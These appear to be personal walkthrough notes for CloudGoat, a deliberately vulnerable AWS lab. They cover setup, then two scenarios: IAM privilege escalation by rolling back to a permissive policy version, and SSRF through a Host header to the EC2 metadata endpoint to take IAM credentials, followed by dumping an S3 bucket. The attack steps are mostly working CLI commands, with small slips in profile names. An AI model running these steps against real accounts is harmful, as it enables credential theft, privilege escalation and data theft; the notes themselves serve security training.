Setting up CloudGoat:

git clone https://github.com/RhinoSecurityLabs/cloudgoat.git ./Cloudgoat 
apt-get update 
apt-get upgrade 
apt-get install python-pip or apt-get install python3-pip
pip/pip3 install -r ./core/python/requirements.txt 
chmod u+x Cloudgoat.py


Steps to install terraform on Ubuntu / Ubuntu cloud server :

1.Install unzip

sudo apt-get install unzip

2.Confirm the latest version number on the terraform website:

https://www.terraform.io/downloads.html

3.Download latest version of the terraform (substituting newer version number if needed)
wget https://releases.hashicorp.com/terraform/0.12.18/terraform_0.12.18_linux_amd64.zip

4.Extract the downloaded file archive
unzip terraform_0.12.18_linux_amd64.zip

5.Move the executable into a directory searched for executables

sudo mv terraform /usr/local/bin/

6.Run it

terraform --version 


iam_privesc_by_rollback:

./cloudgoat.py create iam_privesc_by_rollback

aws configure --profile lab1   -- Give key details

aws sts get-caller-identity --profile lab1

aws iam list-attached-user-policies --user-name raynor-cgidp68ieock3f --profile lab1

aws iam get-user --profile lab1

aws iam list-users --profile lab1

aws iam list-groups --profile lab1

aws iam list-roles --profile lab1

aws iam list-attached-role-policies --role-name AWSServiceRoleForTrustedAdvisor --profile lab1

aws iam list-attached-user-policies --user-name raynor-cgidp68ieock3f --profile lab1

aws iam list-policy-versions --policy-arn arn:aws:iam::233200098581:policy/cg-raynor-policy-cgidp68ieock3f --profile lab1

aws iam get-policy-version --policy-arn arn:aws:iam::233200098581:policy/cg-raynor-policy-cgidp68ieock3f --version-id v1 --profile lab1

Check for the version that allows all


aws iam create-user --user-name rakesh --profile lab1

aws iam set-default-policy-version --policy-arn arn:aws:iam::233200098581:policy/cg-raynor-policy-cgidp68ieock3f --version-id v4 --profile lab1

aws iam create-user --user-name rakesh --profile lab1

Boom! User is created and privelege escalation is done.

Destroy:

./cloudgoat.py destroy iam_privesc_by_rollback



cloud_breach_s3:

./cloudgoat.py create cloud_breach_s3

curl http://ip

Add host header

curl http://ip -H 'Host:169.254.169.254'

--> /latest/meta-data/iam/security-credentials/ - Sensitive info can be found here



aws configure --profile attacker - Use the details we found 

aws iam get-user --profile attacker

aws s3 ls --profile attacker

aws s3 sync s3://bucketname ~/Desktop/dump --profile rakesh







